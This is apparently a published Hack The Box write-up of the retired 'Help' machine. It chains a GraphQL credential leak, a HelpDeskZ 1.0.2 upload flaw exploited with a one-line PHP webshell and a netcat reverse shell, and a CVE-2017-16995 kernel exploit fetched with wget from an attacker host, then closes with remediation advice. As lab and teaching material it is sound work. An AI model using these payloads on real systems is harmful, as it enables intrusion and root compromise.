---
title: "Help: GraphQL Credential Leak to HelpDeskZ Upload RCE"
description: "A GraphQL endpoint leaks HelpDeskZ credentials and an attachment-upload weakness stores rejected PHP files under predictable names for web-service code execution; a kernel eBPF flaw (CVE-2017-16995) escalates to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - graphql
  - helpdeskz
  - kernel-exploit
  - cve-2017-16995
---

## Summary

Help is a Linux machine with two practical foothold paths targeting HelpDeskZ 1.0.2. The primary web route uses a GraphQL endpoint that leaks HelpDeskZ credentials, while a faster path exploits an unauthenticated attachment upload weakness where rejected PHP files remain stored under predictable hashed names. Both paths lead to code execution as the `<WEB_SERVICE_ACCOUNT>` user. Privilege escalation leverages a Linux kernel eBPF vulnerability (CVE-2017-16995) on the outdated Ubuntu kernel.

## Context and Objective

The engagement targets a Linux (Ubuntu) host with three open services: SSH (22), Apache HTTP (80), and a Node.js Express framework (3000). An HTTP virtual host resolves to `<TARGET_HOST>`. The objective is to achieve user-level code execution and escalate to root.

Scope constraints:

- HelpDeskZ 1.0.2 (June 2015) — known weak upload handling and SQL injection issues.
- GraphQL endpoint on port 3000 exposes credential data.
- Ubuntu 16.04 kernel vulnerable to CVE-2017-16995 (eBPF verifier issue).

## Approach and Evidence

### Stage 1 — Service Discovery and Web Enumeration

An initial Rustscan identifies three open ports. Port 80 serves an HTTP application; port 3000 runs a Node.js Express application.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Help-TCP
```

```text
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp   open  http    Apache httpd 2.4.18
3000/tcp open  http    Node.js Express framework
```

Adding the vhost and running directory fuzzing identifies `/support`:

```bash
feroxbuster --url http://<TARGET_HOST> --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

```text
/support
/support/README.md
```

The `README.md` identifies HelpDeskZ version 1.0.2.

### Stage 2 — GraphQL Credential Disclosure

Port 3000 exposes a GraphQL endpoint. Introspection or guessing reveals a `user` object that returns credentials in cleartext:

```bash
curl -s -X POST http://<TARGET_HOST>:3000/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ user { username password } }"}'
```

```json
{
  "data": {
    "user": {
      "username": "<HELPDESKZ_EMAIL>",
      "password": "<MD5_HASHED_PASSWORD>"
    }
  }
}
```

The leaked password is an MD5 hash. Cracking it with a standard wordlist yields the plaintext credential, which authenticates to HelpDeskZ.

### Stage 3 — HelpDeskZ Attachment Upload RCE

HelpDeskZ stores uploaded attachments using a predictable MD5 value derived from the filename and server-side timestamp. The application rejects dangerous extensions in the UI, but the file still remains on disk under the hashed name.

A PHP webshell is submitted as a support ticket attachment:

```php
<?php system($_GET['cmd']); ?>
```

A brute-force script locates the stored hashed filename around the upload timestamp:

```bash
python3 helpdeskz_upload_exploit.py http://<TARGET_HOST>/support/ <UPLOAD_FILENAME>
```

Once found, command execution is triggered through the uploaded file:

```bash
curl 'http://<TARGET_HOST>/support/uploads/tickets/<UPLOAD_HASH>.php?cmd=id'
```

```text
uid=<WEB_SERVICE_UID>(<WEB_SERVICE_ACCOUNT>) gid=<WEB_SERVICE_GID>(<WEB_SERVICE_ACCOUNT>) groups=<WEB_SERVICE_GID>(<WEB_SERVICE_ACCOUNT>)
```

A reverse shell is established through the same upload vector:

```bash
nc -nlvp <LISTENER_PORT>
curl 'http://<TARGET_HOST>/support/uploads/tickets/<UPLOAD_HASH>.php?cmd=<SANITIZED_COMMAND>'
```

User flag recovered from the `<WEB_SERVICE_ACCOUNT>` home directory.

### Stage 4 — Kernel Enumeration and CVE-2017-16995

Kernel and OS version checks confirm the target runs an Ubuntu 16.04 kernel in the vulnerable range for CVE-2017-16995, an eBPF verifier issue enabling local root escalation:

```bash
uname -a
lsb_release -a
```

A known working exploit for CVE-2017-16995 is transferred to the target, compiled, and executed:

```bash
wget http://<ATTACKER_IP>/cve-2017-16995.c -O /tmp/root.c
cd /tmp && gcc root.c -o root && chmod +x root && ./root
```

```text
# whoami
root
```

`<PRIVILEGED_RESULT>` recovered.

## Challenges and Decisions

- Two independent foothold paths were identified: GraphQL credential leak and HelpDeskZ attachment upload. The upload path was faster as it required no credential cracking.
- The predictable upload hash requires brute-forcing around the upload timestamp, which adds a time-based constraint but is reliably exploitable.
- The kernel exploit (CVE-2017-16995) is noisy and unstable in real assessments; it was the intended root escalation path on this lab machine.

## Outcome

The machine demonstrates a complete attack chain: credential disclosure through a misconfigured GraphQL endpoint, exploitation of a known HelpDeskZ upload weakness for code execution, and kernel-level privilege escalation via CVE-2017-16995. Both user and root flags were obtained.

## Lessons and Recommendations

- **Secure GraphQL endpoints.** Disable introspection and restrict query access on internal services. Credential data must never be exposed through unauthenticated GraphQL queries.
- **Patch or replace outdated applications.** HelpDeskZ 1.0.2 (2015) has known upload and injection vulnerabilities. Upgrade to a supported version or replace with maintained software.
- **Validate upload handling server-side.** Rejecting extensions in the UI is insufficient. Server-side validation must prevent storage of dangerous file types under any filename.
- **Keep kernels current.** The Ubuntu 16.04 kernel's eBPF vulnerability (CVE-2017-16995) allows local root escalation. Timely kernel updates prevent exploitation of known privilege escalation vectors.

## References

- Hack The Box: [Help](https://app.hackthebox.com/machines/Help) — retired machine
- [CVE-2017-16995 — Linux Kernel eBPF Verifier Privilege Escalation](https://nvd.nist.gov/vuln/detail/CVE-2017-16995)
